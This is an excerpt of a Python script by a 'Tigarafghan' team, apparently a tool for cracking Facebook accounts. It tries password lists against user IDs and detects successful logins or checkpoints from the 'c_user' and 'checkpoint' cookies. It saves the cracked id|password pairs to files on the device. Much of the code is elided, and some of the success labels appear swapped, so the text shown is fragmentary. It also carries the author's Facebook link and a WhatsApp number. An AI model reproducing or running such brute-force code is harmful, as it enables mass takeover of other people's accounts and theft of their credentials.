...
try:
	...
	os.system('python Tigarafghan.py')
ugen = []
...
--------------------------------------------------
>>  Owner    : Tigarafghan
>>  Facebook : https://www.facebook.com/hajiabdullatif.kakar
>>  Version  : 1.0
>>  Whatsapp : 93700858475
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> JOKER/😍 TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			os.system(f'xdg-open https://www.facebook.com/hajiabdullatif.kakar')
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Tigarafghan.txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/hajiabdullatif.kakar');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			Tigarafghan=session.cookies.get_dict().keys()
			if "c_user" in Tigarafghan:
				print('\r\r\033[1;31m[Tigarafghan-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/Tigarafghan-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Tigarafghan:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Tigarafghan-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Tigarafghan-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in Tigarafghan:
				...
				print('\r\r\033[1;32m[Tigarafghan-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Tigarafghan-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Tigarafghan-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Tigarafghan-OK] '+cid+' | '+ps+'\33[0;97m')
